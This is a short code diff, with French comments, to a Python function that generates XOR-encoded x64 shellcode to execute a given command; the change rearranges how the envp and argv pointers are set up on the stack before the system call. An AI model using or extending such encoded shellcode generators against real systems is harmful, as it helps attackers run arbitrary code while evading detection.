@@ -46,10 +46,10 @@ def generate_shellcode(command: str, arch: str = 'x64', xor_key: int = 0xB6) -> 
             
             initshellcode:
                 xor rax, rax
-                push rax            ; NULL terminator envp
-                mov rdx, rsp        ; rdx = envp
+                ;push rax            ; NULL terminator envp
+                ;mov rdx, rsp        ; rdx = envp
                 
-                push rax            ; NULL terminator argv
+                ;push rax            ; NULL terminator argv
         """
         
         # Ajouter les valeurs encodées
@@ -66,6 +66,7 @@ def generate_shellcode(command: str, arch: str = 'x64', xor_key: int = 0xB6) -> 
             shellcodeExecution:
                 xor rax, rax
                 push rax            ; NULL
+                mov rdx, rsp        ; rdx = envp
                 push rdi            ; ptr vers la chaîne décodée
                 mov rsi, rsp        ; rsi = argv
                 
